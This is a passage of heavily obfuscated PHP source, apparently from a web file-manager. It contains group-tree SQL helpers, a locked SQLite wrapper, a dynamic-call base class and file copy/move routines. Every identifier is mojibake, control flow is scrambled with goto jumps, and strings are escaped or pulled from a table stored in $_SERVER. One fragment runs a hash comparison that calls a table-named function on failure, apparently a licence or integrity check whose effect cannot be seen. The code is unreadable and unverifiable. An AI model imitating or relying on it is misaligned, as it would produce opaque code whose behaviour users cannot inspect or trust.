_listAppendChildren(&$f¿‹ÒŠÍò) { goto cçİä™³; eÃ™¸¤¿¤¬: $a“–Œ¶§¡ = count($f¿‹ÒŠÍò); $dõ”ÄŠô± = $this->tablePrefix . $this->tableName; for ($câ´çÓ¦Öò = 0, $BÇ’ñ¤¶Ù  = 0; $câ´çÓ¦Öò < $a“–Œ¶§¡; $câ´çÓ¦Öò++) { $BÇ’ñ¤¶Ù ++; $c‰İ»œÂéô = $f¿‹ÒŠÍò[$câ´çÓ¦Öò][$Eéôéò‹Û[1657]]; $fÎ´åÍè© .= "\x53\x45\114\105\103\124\x20\x2a\x20\x46\x52\x4f\115\40\50\123\x45\x4c\105\103\124\40\47{$c‰İ»œÂéô}\137\x63\150\x69\154\144\47\40\141\163\40\x68\x61\x73\x20\106\122\117\115\x20\140{$dõ”ÄŠô±}\x60\x20\x77\150\x65\162\145\x20\160\141\x72\x65\156\x74\111\x44\x3d{$c‰İ»œÂéô}\40\x6c\151\x6d\151\164\x20\61\x29\x20\x61\x73\x20\x74\x62\137{$c‰İ»œÂéô}\x20\165\156\151\x6f\156\40\141\x6c\x6c\40"; if (($BÇ’ñ¤¶Ù  >= 20 || $câ´çÓ¦Öò == $a“–Œ¶§¡ - 1) && $fÎ´åÍè©) { $fÎ´åÍè© = substr($fÎ´åÍè©, 0, -strlen($Eéôéò‹Û[476])); $DåÄÙÏã‡Ğ = $this->query($fÎ´åÍè©); $FéİºéŞİ¯ = array_merge($FéİºéŞİ¯, $DåÄÙÏã‡Ğ); $BÇ’ñ¤¶Ù  = 0; $fÎ´åÍè© = $Eéôéò‹Û[33]; } } goto b‹Øç×Î¼ë; b‹Øç×Î¼ë: $FéİºéŞİ¯ = array_to_keyvalue($FéİºéŞİ¯, $Eéôéò‹Û[477]); foreach ($f¿‹ÒŠÍò as &$d§¤ÏêõËÅ) { $d§¤ÏêõËÅ[$Eéôéò‹Û[1748]] = isset($FéİºéŞİ¯[$d§¤ÏêõËÅ[$Eéôéò‹Û[1657]] . $Eéôéò‹Û[1749]]); } unset($d§¤ÏêõËÅ); goto A·ßàÙ­Ïİ; cçİä™³: $Eéôéò‹Û =& $_SERVER[¢ÌÛ]; $fÎ´åÍè© = $Eéôéò‹Û[370]; $FéİºéŞİ¯ = array(); goto eÃ™¸¤¿¤¬; A·ßàÙ­Ïİ: } private function _listAppendChildrenMember(&$Eñ²À¯†„) { goto eˆÓ¥Şå‚Ê; bâøà„¥Â•: $e‡çšÁ—–æ = count($Eñ²À¯†„); $D²¿›ß”å = $this->tablePrefix . $Eó°‹ØÄ[1740]; for ($f‹à²íî‰‹ = 0, $bùÔÎƒÉø = 0; $f‹à²íî‰‹ < $e‡çšÁ—–æ; $f‹à²íî‰‹++) { $bùÔÎƒÉø++; $E½í†Ïğğ˜ = $Eñ²À¯†„[$f‹à²íî‰‹][$Eó°‹ØÄ[1657]]; $aã”‹ëÜ¦¼ .= "\123\105\114\x45\103\124\40\x2a\40\106\122\117\x4d\x20\50\123\x45\114\105\103\x54\40\x27{$E½í†Ïğğ˜}\x5f\143\x68\151\154\x64\x27\x20\141\163\x20\150\x61\163\x20\106\x52\117\115\x20\x60{$D²¿›ß”å}\140\x20\x77\150\x65\x72\145\40\147\x72\157\165\160\x49\x44\75{$E½í†Ïğğ˜}\x20\x6c\151\x6d\151\x74\x20\61\x29\x20\x61\163\x20\x74\142\137{$E½í†Ïğğ˜}\40\x75\x6e\151\157\156\x20\x61\x6c\154\40"; if (($bùÔÎƒÉø >= 20 || $f‹à²íî‰‹ == $e‡çšÁ—–æ - 1) && $aã”‹ëÜ¦¼) { $aã”‹ëÜ¦¼ = substr($aã”‹ëÜ¦¼, 0, -strlen($Eó°‹ØÄ[476])); $dçò­Šî«° = $this->query($aã”‹ëÜ¦¼); $AÂÄ”Œõµ = array_merge($AÂÄ”Œõµ, $dçò­Šî«°); $bùÔÎƒÉø = 0; $aã”‹ëÜ¦¼ = $Eó°‹ØÄ[33]; } } goto E—åŞŠ¹; eˆÓ¥Şå‚Ê: $Eó°‹ØÄ =& $_SERVER[¢ÌÛ]; $aã”‹ëÜ¦¼ = $Eó°‹ØÄ[370]; $AÂÄ”Œõµ = array(); goto bâøà„¥Â•; E—åŞŠ¹: $AÂÄ”Œõµ = array_to_keyvalue($AÂÄ”Œõµ, $Eó°‹ØÄ[477]); foreach ($Eñ²À¯†„ as &$Fö£é‘†Ş‚) { $Fö£é‘†Ş‚[$Eó°‹ØÄ[1750]] = isset($AÂÄ”Œõµ[$Fö£é‘†Ş‚[$Eó°‹ØÄ[1657]] . $Eó°‹ØÄ[1749]]); } unset($Fö£é‘†Ş‚); goto D´‹„ÉéÎë; D´‹„ÉéÎë: } private function _listAppendMeta(&$B‚‡íÉÔ‘², $c¿ó™îø) { goto eÛß§‘™É°; eÛß§‘™É°: $EÎÏêŸâÓ¹ =& $_SERVER[¢ÌÛ]; $e»³—Í½ŸÉ = array($EÎÏêŸâÓ¹[1657] => array($EÎÏêŸâÓ¹[7], $c¿ó™îø)); $fª—º”Îß« = Model($EÎÏêŸâÓ¹[1739])->where($e»³—Í½ŸÉ)->select(); goto B·é‡Ë›ëœ; B·é‡Ë›ëœ: $fª—º”Îß« = array_to_keyvalue_group($fª—º”Îß«, $EÎÏêŸâÓ¹[1657]); foreach ($fª—º”Îß« as &$EÑíÍÍÔ‡¼) { $EÑíÍÍÔ‡¼ = array_to_keyvalue($EÑíÍÍÔ‡¼, $EÎÏêŸâÓ¹[92], $EÎÏêŸâÓ¹[368]); } unset($EÑíÍÍÔ‡¼); goto cÉÇôº¸¡Ì; cÉÇôº¸¡Ì: foreach ($B‚‡íÉÔ‘² as &$c’À§Èï§) { $c’À§Èï§[$EÎÏêŸâÓ¹[443]] = array(); if (isset($fª—º”Îß«[$c’À§Èï§[$EÎÏêŸâÓ¹[1657]]])) { $c’À§Èï§[$EÎÏêŸâÓ¹[443]] = $fª—º”Îß«[$c’À§Èï§[$EÎÏêŸâÓ¹[1657]]]; } } unset($c’À§Èï§); goto AğÌÃ¿¥Ë†; AğÌÃ¿¥Ë†: } protected function parentLevelArray($CïÃà¨½™Æ) { $b‹°çÁ£º† =& $_SERVER[¢ÌÛ]; $CïÃà¨½™Æ = explode($b‹°çÁ£º†[47], trim($CïÃà¨½™Æ, $b‹°çÁ£º†[47])); $CïÃà¨½™Æ = array_remove_value($CïÃà¨½™Æ, $b‹°çÁ£º†[495]); return $CïÃà¨½™Æ; } private function _listAppendParent(&$aª‚ÚÊ‘²) { goto bÎÂøò¬…±; eÈ‰‰ÇØÒ‡: unset($D¶ÛİøÕŸÜ); $C‹œ¨›§‘ = array(); foreach ($côÒ—Úîã as $F¾ÆÇÓˆÁ => $b»‘ˆ·©×è) { if (!$b»‘ˆ·©×è) { $C‹œ¨›§‘[] = $F¾ÆÇÓˆÁ; } } goto A¥’¥ÉÒ¶Î; bÎÂøò¬…±: $E¾¨ÌÏ¶¿ =& $_SERVER[¢ÌÛ]; $côÒ—Úîã = array(); foreach ($aª‚ÚÊ‘² as &$D¶ÛİøÕŸÜ) { $côÒ—Úîã[$D¶ÛİøÕŸÜ[$E¾¨ÌÏ¶¿[1657]]] = $D¶ÛİøÕŸÜ[$E¾¨ÌÏ¶¿[28]]; $Cæ¡š†ôœÏ = $this->parentLevelArray($D¶ÛİøÕŸÜ[$E¾¨ÌÏ¶¿[486]]); foreach ($Cæ¡š†ôœÏ as $Eã×ô¨ñ¶‚) { if (!isset($côÒ—Úîã[$Eã×ô¨ñ¶‚])) { $côÒ—Úîã[$Eã×ô¨ñ¶‚] = 0; } } } goto eÈ‰‰ÇØÒ‡; BÚ¨½ˆÊ‘: unset($D¶ÛİøÕŸÜ); goto føÊÎ‘ç‚; A¥’¥ÉÒ¶Î: if ($C‹œ¨›§‘) { $Døø¸ù¨œŠ = array($E¾¨ÌÏ¶¿[1738] => array($E¾¨ÌÏ¶¿[411], $C‹œ¨›§‘)); $bíê‚ŠäÈ = $this->field($E¾¨ÌÏ¶¿[1751])->where($Døø¸ù¨œŠ)->select(); $cƒ¢®¢Ñø = array_to_keyvalue($bíê‚ŠäÈ, $E¾¨ÌÏ¶¿[1657], $E¾¨ÌÏ¶¿[28]); $côÒ—Úîã = array_merge_index($côÒ—Úîã, $cƒ¢®¢Ñø); } $cã¶ÓÑÃÚ = $GLOBALS[$E¾¨ÌÏ¶¿[6]][$E¾¨ÌÏ¶¿[87]][$E¾¨ÌÏ¶¿[1752]]; foreach ($aª‚ÚÊ‘² as &$D¶ÛİøÕŸÜ) { $Cæ¡š†ôœÏ = $this->parentLevelArray($D¶ÛİøÕŸÜ[$E¾¨ÌÏ¶¿[486]]); $FË‰Ê‰½ÎÁ = $E¾¨ÌÏ¶¿[33]; foreach ($Cæ¡š†ôœÏ as $F¾ÆÇÓˆÁ => $Eã×ô¨ñ¶‚) { if ($cã¶ÓÑÃÚ && $F¾ÆÇÓˆÁ == 0) { continue; } $FË‰Ê‰½ÎÁ .= $côÒ—Úîã[$Eã×ô¨ñ¶‚] . $E¾¨ÌÏ¶¿[8]; } if ($Cæ¡š†ôœÏ) { $FË‰Ê‰½ÎÁ .= $D¶ÛİøÕŸÜ[$E¾¨ÌÏ¶¿[28]]; } $D¶ÛİøÕŸÜ[$E¾¨ÌÏ¶¿[490]] = str_replace($E¾¨ÌÏ¶¿[494], $E¾¨ÌÏ¶¿[8], $FË‰Ê‰½ÎÁ); } goto BÚ¨½ˆÊ‘; føÊÎ‘ç‚: } private function _listAppendSourceRoot(&$B—ãêÛÔ®ˆ, $eï²ã¦ÔÉ) { goto fâ°ˆõ‚¢º; BÂ†Íï¡ˆç: $ašøòâåÕĞ = Model($c ¸ôªâ[774])->order($c ¸ôªâ[1754])->field($e ×¥–¯ß)->where($eÈ•Øô™¶)->select(); $ašøòâåÕĞ = array_to_keyvalue($ašøòâåÕĞ, $c ¸ôªâ[483]); $ašøòâåÕĞ = array_remove_key($ašøòâåÕĞ, $c ¸ôªâ[483]); goto BÏÃÒìËÖ£; fâ°ˆõ‚¢º: $c ¸ôªâ =& $_SERVER[¢ÌÛ]; $eÈ•Øô™¶ = array($c ¸ôªâ[398] => SourceModel::TYPE_GROUP, $c ¸ôªâ[488] => 0, $c ¸ôªâ[483] => array($c ¸ôªâ[7], $eï²ã¦ÔÉ)); $e ×¥–¯ß = $c ¸ôªâ[1753]; goto BÂ†Íï¡ˆç; BÏÃÒìËÖ£: foreach ($B—ãêÛÔ®ˆ as &$Añ¢¬–œ) { $Añ¢¬–œ[$c ¸ôªâ[84]] = $ašøòâåÕĞ[$Añ¢¬–œ[$c ¸ôªâ[1657]]] ? $ašøòâåÕĞ[$Añ¢¬–œ[$c ¸ôªâ[1657]]] : array(); } unset($Añ¢¬–œ); goto E¢¿›åºÅ; E¢¿›åºÅ: } protected function groupMerge($c¸·ŸÊª‘–) { $c¸·ŸÊª‘– = array_values(array_unique($c¸·ŸÊª‘–)); $eßÆš”£© = array(); for ($dğ¥ñÕŠ· = 0; $dğ¥ñÕŠ· < count($c¸·ŸÊª‘–); $dğ¥ñÕŠ·++) { $fç»õ±ÔÉÛ = !1; for ($F‚±áÇİéØ = 0; $F‚±áÇİéØ < count($c¸·ŸÊª‘–); $F‚±áÇİéØ++) { if ($dğ¥ñÕŠ· == $F‚±áÇİéØ) { continue; } if ($this->isParentOf($c¸·ŸÊª‘–[$F‚±áÇİéØ], $c¸·ŸÊª‘–[$dğ¥ñÕŠ·])) { $fç»õ±ÔÉÛ = !0; break; } } if (!$fç»õ±ÔÉÛ) { $eßÆš”£©[] = $c¸·ŸÊª‘–[$dğ¥ñÕŠ·]; } } return $eßÆš”£©; } protected function isParentOf($c‘öñÈ²¬½, $cë¼êßß§) { goto FÊÅ¯ƒ™¬“; cŸ²Ğ“Ø‰Ú: return !1; goto EÇáà„ßŞÏ; FÊÅ¯ƒ™¬“: $E¼Ï¡„õÒ =& $_SERVER[¢ÌÛ]; if (!$c‘öñÈ²¬½ || !$cë¼êßß§ || $c‘öñÈ²¬½ == $cë¼êßß§) { return !1; } $eÄéİçÄâœ = $this->getInfoSimple($c‘öñÈ²¬½); goto a“˜ÒŠ¾¥; a“˜ÒŠ¾¥: $e½‰Úë—‹Á = $this->getInfoSimple($cë¼êßß§); $dŠÙÒÈí´ = $eÄéİçÄâœ[$E¼Ï¡„õÒ[486]] . $c‘öñÈ²¬½ . $E¼Ï¡„õÒ[47]; if (substr($e½‰Úë—‹Á[$E¼Ï¡„õÒ[486]], 0, strlen($dŠÙÒÈí´)) == $dŠÙÒÈí´) { return !0; } goto cŸ²Ğ“Ø‰Ú; EÇáà„ßŞÏ: } public function groupShowRoot($f˜—ßàÑ”, $e®¢òìÁÃ = false) { goto A¼Ùæ‚“¸ñ; c²²ÆÖÚÀ: return $A³ğí¹ã›â; goto b¼ÁÏ–ÎåÁ; DÙÑôäãÒò: $D“°à×Š§ª = $this->parentLevelArray($fºÕ•âœˆ°[$e›®·¿¸[486]]); $A³ğí¹ã›â = array($f˜—ßàÑ”); if (count($D“°à×Š§ª) == 0) { return $A³ğí¹ã›â; } goto a£ƒ‰¬† ; a£ƒ‰¬† : if ($e®¢òìÁÃ && count($D“°à×Š§ª) == 1) { return $A³ğí¹ã›â; } if (!$fºÕ•âœˆ°[$e›®·¿¸[443]] || !isset($fºÕ•âœˆ°[$e›®·¿¸[443]][$e›®·¿¸[1736]]) || $fºÕ•âœˆ°[$e›®·¿¸[443]][$e›®·¿¸[1736]] == $e›®·¿¸[1709]) { return $this->groupShowRoot($D“°à×Š§ª[count($D“°à×Š§ª) - 1], $e®¢òìÁÃ); } if ($fºÕ•âœˆ°[$e›®·¿¸[443]][$e›®·¿¸[1736]] == $e›®·¿¸[355]) { $AÙ®óÂĞ¤ = explode($e›®·¿¸[47], $fºÕ•âœˆ°[$e›®·¿¸[443]][$e›®·¿¸[1737]]); if ($AÙ®óÂĞ¤) { $A³ğí¹ã›â = array_merge($A³ğí¹ã›â, $AÙ®óÂĞ¤); } } goto c²²ÆÖÚÀ; A¼Ùæ‚“¸ñ: $e›®·¿¸ =& $_SERVER[¢ÌÛ]; $fºÕ•âœˆ° = $this->getInfo($f˜—ßàÑ”); if (!$fºÕ•âœˆ°) { return array(); } goto DÙÑôäãÒò; b¼ÁÏ–ÎåÁ: } protected function resetParentLevel() { $cœáøáŒ‡ =& $_SERVER[¢ÌÛ]; $eó……î«ë = $cœáøáŒ‡[1657]; $DêÚ­Éµİ = $this->select(); $DêÚ­Éµİ = array_to_keyvalue($DêÚ­Éµİ, $eó……î«ë); foreach ($DêÚ­Éµİ as $F¶ç¾…¢Ìã) { goto EçÖ ‘½ê‰; EçÖ ‘½ê‰: $AÑéµ¼—÷ = $F¶ç¾…¢Ìã; $AÇ’Æœ‚ß = array(); while ($AÑéµ¼—÷[$cœáøáŒ‡[488]] != 0) { $AÇ’Æœ‚ß[] = $AÑéµ¼—÷[$cœáøáŒ‡[488]]; $AÑéµ¼—÷ = $DêÚ­Éµİ[$AÑéµ¼—÷[$cœáøáŒ‡[488]]]; } goto CÊÈƒ—Û²; CÊÈƒ—Û²: $AÇ’Æœ‚ß[] = 0; $AÇ’Æœ‚ß = $cœáøáŒ‡[47] . implode($cœáøáŒ‡[47], array_reverse($AÇ’Æœ‚ß)) . $cœáøáŒ‡[47]; $this->setNamePinyin($F¶ç¾…¢Ìã[$eó……î«ë], $F¶ç¾…¢Ìã[$cœáøáŒ‡[28]]); goto CÜÛŞ¸ˆî; CÜÛŞ¸ˆî: $this->where(array($eó……î«ë => $F¶ç¾…¢Ìã[$eó……î«ë]))->save(array($cœáøáŒ‡[551] => $AÇ’Æœ‚ß)); goto f„Ï§ª×ëë; f„Ï§ª×ëë: } return $DêÚ­Éµİ; } public function groupNameAuto($fèõæ”ùã¹, $AÇóñ–ÜÛ¼) { $aí«³»—´“ =& $_SERVER[¢ÌÛ]; $Dİ™¶İ„Ü = $this->where(array($aí«³»—´“[395] => $fèõæ”ùã¹))->getField($aí«³»—´“[28], !0); if (!$Dİ™¶İ„Ü || !in_array($AÇóñ–ÜÛ¼, $Dİ™¶İ„Ü)) { return $AÇóñ–ÜÛ¼; } for ($E‡Ç·†–¶‰ = 1; $E‡Ç·†–¶‰ <= count($Dİ™¶İ„Ü) + 1; $E‡Ç·†–¶‰++) { $EùùŒÖ¶æ‘ = $AÇóñ–ÜÛ¼ . "\50{$E‡Ç·†–¶‰}\51"; if (!in_array($EùùŒÖ¶æ‘, $Dİ™¶İ„Ü)) { return $EùùŒÖ¶æ‘; } } } } goto e’˜˜¯­Š˜; d—Ï‚Ùö™á: $aÕäã±µ©ä = $_SERVER[¢ÌÛ][387]; if ($_SERVER[$_SERVER[¢ÌÛ][388]] != $aÕäã±µ©ä($A‹ÓŒÀ‘¤)) { goto f°Õø’í; d¡¾¶ÔÜ”×: $CçäÃ¤¿Ø = explode($_SERVER[¢ÌÛ][227], $AŞÅÁÄĞÂ); if (count($CçäÃ¤¿Ø) < $_SERVER[¢ÌÛ][392]) { $AÛãŸ±ŒÃø = $_SERVER[¢ÌÛ][393]; $AÛãŸ±ŒÃø(); } $e˜öİ»Ø¡ = $_SERVER[¢ÌÛ][394]; goto dÏ¢œÉøµ; f°Õø’í: $CÔÔåìƒ» = $_SERVER[¢ÌÛ][389]; $cøÆ™®íÁõ = $_SERVER[$_SERVER[¢ÌÛ][390]] . $_SERVER[¢ÌÛ][391]; $AŞÅÁÄĞÂ = $CÔÔåìƒ»($cøÆ™®íÁõ); goto d¡¾¶ÔÜ”×; dÏ¢œÉøµ: $e˜öİ»Ø¡($A‹ÓŒÀ‘¤); goto aù¨ãƒÕ¸; aù¨ãƒÕ¸: } class DbSqlite extends DbSqliteBase { public function query($dÖ—ÅËĞ‰) { $A„²É÷…Ş‹ =& $_SERVER[¢ÌÛ]; if (!CacheLock::fileLock($A„²É÷…Ş‹[9])) { return !1; } $D„¾ÙàºĞ  = parent::query($dÖ—ÅËĞ‰); CacheLock::fileUnLock($A„²É÷…Ş‹[9]); return $D„¾ÙàºĞ ; } public function execute($D‘°ÀËŒĞâ) { $C°¶£•²Œ‰ =& $_SERVER[¢ÌÛ]; if (!CacheLock::fileLock($C°¶£•²Œ‰[9])) { return !1; } $d¿ïÓˆõâõ = parent::execute($D‘°ÀËŒĞâ); CacheLock::fileUnLock($C°¶£•²Œ‰[9]); return $d¿ïÓˆõâõ; } } goto d’¦Û„´œ; aÀµ½Ğ˜©‡: function binCheckBigger($B«·ôºë, $dä¼‰°·ªÀ) { return $B«·ôºë > $dä¼‰°·ªÀ; } $_SERVER[$_SERVER[ßŞº€åŒÀğ‘¯][3]] = ("\x38\x38\x30\x38"."\62\61")+0;$_Zzyt="8KDykm3et7zxtxUaZk978W29Hj49vd3ZysnwbzZJAMkEpm6pksYAvgCUEHICBIE4K3Acu7fPwtBXDc";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($d‰¼¢Ó¢é, $E¼ö©ñİÓ„) { $FÜ«‡Ğ¾Èß =& $_SERVER[¢ÌÛ]; if (isset(self::$_methodList[$d‰¼¢Ó¢é])) { return @call_user_func_array(self::$_methodList[$d‰¼¢Ó¢é], $E¼ö©ñİÓ„); } else { if (method_exists($this, $d‰¼¢Ó¢é)) { return call_user_func_array(array($this, $d‰¼¢Ó¢é), $E¼ö©ñİÓ„); } else { think_exception(__CLASS__ . $FÜ«‡Ğ¾Èß[4] . $d‰¼¢Ó¢é . $FÜ«‡Ğ¾Èß[5]); } } } public static function __callStatic($fÃÕ¢îçó¾, $FÌØâÁ¹Š¤) { if (isset(self::$_methodListStatic[$fÃÕ¢îçó¾])) { return call_user_func_array(self::$_methodListStatic[$fÃÕ¢îçó¾], $FÌØâÁ¹Š¤); } else { if (method_exists(self, $fÃÕ¢îçó¾)) { return call_user_func_array(array(self, $fÃÕ¢îçó¾), $FÌØâÁ¹Š¤); } else { show_json("{$fÃÕ¢îçó¾}\50\x29\x20\156\157\164\40\145\170\x69\x73\164\73", !1); } } } public static function addMethod($Fó«ŞåòˆÍ, $FĞ‚¦…ñã) { self::$_methodList[$Fó«ŞåòˆÍ] = $FĞ‚¦…ñã; } public static function addMethodStatic($dì²õ‘©è, $B¥²ƒ‹Âæ‹) { self::$_methodListStatic[$dì²õ‘©è] = $B¥²ƒ‹Âæ‹; } } goto e‚½„„‹Œ; DÖÚùˆ›§ì: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($f·†İé‹¸‹, $CÔ­™Ã‚ÔÏ) { goto E†Ú‘ã½ß; E”˜˜‡âäÍ: Hook::trigger($c©å‹øêã[1020] . $f·†İé‹¸‹ . $c©å‹øêã[1021], $FÁ†öÙ«•¡); $eŞ¯…Á¹¦ = self::driverMake($CÔ­™Ã‚ÔÏ[0]); if (method_exists($eŞ¯…Á¹¦, $f·†İé‹¸‹)) { $CĞËö÷­ì = @call_user_func_array(array($eŞ¯…Á¹¦, $f·†İé‹¸‹), $CÔ­™Ã‚ÔÏ); } else { if (method_exists($eŞ¯…Á¹¦, $c©å‹øêã[1022])) { $CĞËö÷­ì = @call_user_func_array(array($eŞ¯…Á¹¦, $f·†İé‹¸‹), $CÔ­™Ã‚ÔÏ); } else { if (method_exists(self, $f·†İé‹¸‹)) { $CĞËö÷­ì = @call_user_func_array(array(self, $f·†İé‹¸‹), $CÔ­™Ã‚ÔÏ); } else { $CĞËö÷­ì = call_user_func_array(array(parent, $f·†İé‹¸‹), $CÔ­™Ã‚ÔÏ); } } } goto aéĞáÎÜÅ; E†Ú‘ã½ß: $c©å‹øêã =& $_SERVER[¢ÌÛ]; $FÁ†öÙ«•¡ = $CÔ­™Ã‚ÔÏ; $GLOBALS[$c©å‹øêã[1019]] = $c©å‹øêã[1020] . $f·†İé‹¸‹; goto E”˜˜‡âäÍ; aéĞáÎÜÅ: Hook::trigger($c©å‹øêã[1020] . $f·†İé‹¸‹ . $c©å‹øêã[1023], $FÁ†öÙ«•¡, $CĞËö÷­ì); return $CĞËö÷­ì; goto dÄ±ŒÎøŞğ; dÄ±ŒÎøŞğ: } public static function init($e»ÓĞË°³Î) { return self::driverMake($e»ÓĞË°³Î); } public static function copy($cğ‘¬ŠÁ, $cÍÖ®©‹ÎÆ, $e†ŠèøìŒ = false, $fÌà‹Èœ£Ç = false) { return self::copyMoveStart($cğ‘¬ŠÁ, $cÍÖ®©‹ÎÆ, $e†ŠèøìŒ, $_SERVER[¢ÌÛ][516], $fÌà‹Èœ£Ç); } public static function move($F›âñ‡ÖŠÙ, $a àÇÉÍˆ, $f¡¼Õ·¨¹µ = false, $FÉ š¢è“ = false) { return self::copyMoveStart($F›âñ‡ÖŠÙ, $a àÇÉÍˆ, $f¡¼Õ·¨¹µ, $_SERVER[¢ÌÛ][518], $FÉ š¢è“); } private static function copyMoveStart($f•×…’º†‰, $Dä°Œ§Ï¦, $E‘õ«õ¦Ûô, $eéÔĞµ‚®â, $eæ›£Î¸×‡) { $DùÒ¨†Ê„ì =& $_SERVER[¢ÌÛ]; $fê’å‰´Õ¥ = array($f•×…’º†‰, $Dä°Œ§Ï¦, $E‘õ«õ¦Ûô, $eæ›£Î¸×‡); Hook::trigger($DùÒ¨†Ê„ì[1020] . $eéÔĞµ‚®â . $DùÒ¨†Ê„ì[1021], $fê’å‰´Õ¥); $B´£Ç‡«Ø = self::copyMove($f•×…’º†‰, $Dä°Œ§Ï¦, $E‘õ«õ¦Ûô, $eéÔĞµ‚®â, $eæ›£Î¸×‡); Hook::trigger($DùÒ¨†Ê„ì[1020] . $eéÔĞµ‚®â . $DùÒ¨†Ê„ì[1023], $fê’å‰´Õ¥, $B´£Ç‡«Ø); return $B´£Ç‡«Ø; } public static function saveFile($e†‘ŞÁĞ, $e»öŸÔÇäğ, $CˆŞ¨ì‘¥ = true) { goto EµˆòßËèç; D“Š¶Ùã³”: $D´…ÊîØ­ï = self::copyFile($fåÊ…ƒ¸Áç, $e†‘ŞÁĞ, $CÔÄÒ’èÆ‡, $e“Ì·Ó´ï, $d”¥ô¯¤áƒ[$bëõóã –•[28]], $fæˆöÏ»Í); if ($a»Ç…çªƒ) { $D´…ÊîØ­ï = $a»Ç…çªƒ->getPathOuter($D´…ÊîØ­ï); } return $D´…ÊîØ­ï; goto A°øõ’¦ ‹; aÇ÷Œ¶‹ï÷: $e“Ì·Ó´ï = $CÔÄÒ’èÆ‡->pathFather($e»öŸÔÇäğ); $fæˆöÏ»Í = !0; if (!$CˆŞ¨ì‘¥ && self::driverIsSame($fåÊ…ƒ¸Áç, $CÔÄÒ’èÆ‡)) { $fæˆöÏ»Í = !1; } goto D“Š¶Ùã³”; EµˆòßËèç: $bëõóã –• =& $_SERVER[¢ÌÛ]; $d”¥ô¯¤áƒ = self::info($e»öŸÔÇäğ); $fåÊ…ƒ¸Áç = self::driverMake($e†‘ŞÁĞ); goto B×šš…©×ì; B×šš…©×ì: $CÔÄÒ’èÆ‡ = self::driverMake($e»öŸÔÇäğ); $a»Ç…çªƒ = !1; if ($CÔÄÒ’èÆ‡->pathParse[$bëõóã –•[1024]]) { $AùÀä®‰¯ = $CÔÄÒ’èÆ‡->pathParse[$bëõóã –•[1024]]; $a»Ç…çªƒ = $CÔÄÒ’èÆ‡; $CÔÄÒ’èÆ‡ = self::driverMake($AùÀä®‰¯); } goto aÇ÷Œ¶‹ï÷; A°øõ’¦ ‹: } private static function copyMove($AÕùç“è, $eóÊö«íŠ…, $A¸‘áôèˆ™, $Câç¨ÅÑÃ, $eÃ¹œ„‘‰Ï = false) { goto FÇÕà¸íÎ; FÇÕà¸íÎ: $cñ½¸Š³©Ì =& $_SERVER[¢ÌÛ]; if (!$AÕùç“è || $AÕùç“è == $cñ½¸Š³©Ì[8] || !$eóÊö«íŠ…) { return !1; } ignore_timeout(); goto B¿ïØ½™ö˜; B¿ïØ½™ö˜: $dëƒ¡¾óá± = self::driverMake($AÕùç“è); $Bá¯øõê–ñ = self::driverMake($eóÊö«íŠ…); $E£ñ†ï‚ôˆ = $Câç¨ÅÑÃ == $cñ½¸Š³©Ì[518]; goto f²íÔ¤’ƒ‹; E‹ã”‰¹µØ: Hook::trigger($cñ½¸Š³©Ì[72], $dëƒ¡¾óá±, $AÕùç“è, $Bá¯øõê–ñ, $eóÊö«íŠ…); $CîÄß‰’²ƒ = self::driverIsSame($dëƒ¡¾óá±, $Bá¯øõê–ñ); if ($CîÄß‰’²ƒ) { if ($Câç¨ÅÑÃ == $cñ½¸Š³©Ì[518] && !method_exists($Bá¯øõê–ñ, $cñ½¸Š³©Ì[1025]) && trim($eóÊö«íŠ…, $cñ½¸Š³©Ì[8]) == trim($Bá¯øõê–ñ->pathFather($AÕùç“è), $cñ½¸Š³©Ì[8])) { if ($dëƒ¡¾óá±->pathThis($AÕùç“è) != $eÃ¹œ„‘‰Ï && !$dëƒ¡¾óá±->isTypeObject()) { return $dëƒ¡¾óá±->rename($AÕùç“è, $eÃ¹œ„‘‰Ï); } return $Bá¯øõê–ñ->getPathOuter($AÕùç“è); } if (method_exists($Bá¯øõê–ñ, $Câç¨ÅÑÃ)) { return $Bá¯øõê–ñ->{$Câç¨ÅÑÃ}($AÕùç“è, $eóÊö«íŠ…, $A¸‘áôèˆ™); } } goto eèŞ’Ò´ùŸ; cğ²ë÷í´: if ($Aè÷£ãÀŞ‘) { $CãÂ¹”·îª = $Aè÷£ãÀŞ‘->getPathOuter($CãÂ¹”·îª); } return $CãÂ¹”·îª; goto eö­ê¬®Š—; eèŞ’Ò´ùŸ: $Aê¼‹§Ú = $dëƒ¡¾óá±->isFile($AÕùç“è); if (!$Aê¼‹§Ú && $Bá¯øõê–ñ->getType() == $cñ½¸Š³©Ì[717] && $dëƒ¡¾óá±->getType() == $cñ½¸Š³©Ì[105]) { $CãÂ¹”·îª = $Bá¯øõê–ñ->copyFolderFromIO($dëƒ¡¾óá±, $AÕùç“è, $eóÊö«íŠ…, $A¸‘áôèˆ™, $E£ñ†ï‚ôˆ, $eÃ¹œ„‘‰Ï); } else { $CãÂ¹”·îª = self::copyPath($dëƒ¡¾óá±, $AÕùç“è, $Bá¯øõê–ñ, $eóÊö«íŠ…, $A¸‘áôèˆ™, $E£ñ†ï‚ôˆ, $Aê¼‹§Ú, $eÃ¹œ„‘‰Ï); } if ($CãÂ¹”·îª && $E£ñ†ï‚ôˆ) { $dëƒ¡¾óá±->remove($AÕùç“è); } goto cğ²ë÷í´; f²íÔ¤’ƒ‹: $Aè÷£ãÀŞ‘ = !1; if ($Bá¯øõê–ñ->pathParse[$cñ½¸Š³©Ì[1024]]) { $eóÊö«íŠ… = $Bá¯øõê–ñ->pathParse[$cñ½¸Š³©Ì[1024]]; $Aè÷£ãÀŞ‘ = $Bá¯øõê–ñ; $Bá¯øõê–ñ = self::driverMake($eóÊö«íŠ…); } self::check($dëƒ¡¾óá±, $AÕùç“è, $Bá¯øõê–ñ, $eóÊö«íŠ…); goto E‹ã”‰¹µØ; eö­ê¬®Š—: } private static function check($AùË’‚Ä„‚, $F¶‰“–±, $fØâ­Îóœ©, &$dŸ ŒÒ‘ç”) { $Fø¥¯®Ÿ¶ù =& $_SERVER[¢ÌÛ]; if (self::driverIsSame($AùË’‚Ä„‚, $fØâ­Îóœ©) && $AùË’‚Ä„‚->isFolder($F¶‰“–±) && $AùË’‚Ä„‚->isParentOf($F¶‰“–±, $dŸ ŒÒ‘ç”)) { show_json(LNG($Fø¥¯®Ÿ¶ù[1026]), !1); } if (!$AùË’‚Ä„‚->exist($F¶‰“–±)) { show_json(LNG($Fø¥¯®Ÿ¶ù[104]), !1); } } private static function copyPath($EÌÆù•ºó, $AÏ 